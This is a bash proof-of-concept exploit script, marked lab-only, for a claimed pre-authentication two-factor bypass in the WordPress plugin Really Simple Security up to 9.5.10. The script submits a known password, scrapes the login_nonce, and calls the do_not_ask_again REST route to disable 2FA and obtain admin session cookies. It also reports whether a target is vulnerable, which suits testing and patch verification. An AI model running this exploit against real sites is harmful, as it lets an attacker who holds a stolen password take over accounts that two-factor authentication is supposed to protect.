#!/usr/bin/env bash
# CVE-2026-48970 — Really Simple Security <= 9.5.10 pre-auth 2FA disable
# Lab-only PoC. Verified against 9.5.6 (vulnerable) and 9.5.11 (patched).
#
# Precondition: valid username+password for a user with an active 2FA provider.
# The password step issues a `login_nonce`; the pre-auth REST route
# `do_not_ask_again` accepts it and disables 2FA, then sets auth cookies.
# Result: 2FA is optional whenever the password is known.
#
# Usage: BASE=http://localhost:8089 USER=admin PASS='Admin123!' ./poc.sh

set -euo pipefail
BASE="${BASE:-http://localhost:8089}"
WPUSER="${WPUSER:-admin}"
PASS="${PASS:-Admin123!}"
JAR="$(mktemp)"

# 1. password step
curl -sS -c "$JAR" -o /dev/null "$BASE/wp-login.php"
curl -sS -b "$JAR" -c "$JAR" -o /tmp/step1.html "$BASE/wp-login.php" \
  --data-urlencode "log=$WPUSER" --data-urlencode "pwd=$PASS" \
  --data-urlencode "wp-submit=Log In" --data-urlencode "redirect_to=$BASE/wp-admin/" \
  --data-urlencode "testcookie=1"

NONCE=$(grep -oE '"login_nonce":"[a-f0-9]+"' /tmp/step1.html | cut -d'"' -f4 || true)
if [ -z "$NONCE" ]; then
  echo "[-] no 2FA challenge produced (user has no active 2FA provider)"
  exit 1
fi
echo "[+] login_nonce: $NONCE"

# 2. pre-auth call that disables 2FA and issues the session cookie
CODE=$(curl -sS -b "$JAR" -c "$JAR" -o /tmp/step2.json -w '%{http_code}' \
  -X POST "$BASE/?rest_route=/really-simple-security/v1/two-fa/v2/do_not_ask_again" \
  --data "user_id=1" --data "login_nonce=$NONCE" --data "redirect_to=$BASE/wp-admin/")
echo "[*] do_not_ask_again -> $CODE $(cat /tmp/step2.json)"

# 3. session check
DASH=$(curl -sS -b "$JAR" -o /tmp/dash.html -w '%{http_code}' "$BASE/wp-admin/")
TITLE=$(grep -oE '<title>[^<]*' /tmp/dash.html | head -1 || true)
echo "[*] wp-admin -> $DASH $TITLE"

if [ "$CODE" = "200" ] && grep -q wordpress_logged_in "$JAR"; then
  echo "[!] VULNERABLE: 2FA bypassed with password only"
  exit 0
fi
echo "[+] blocked: 2FA required before it can be disabled"
exit 2
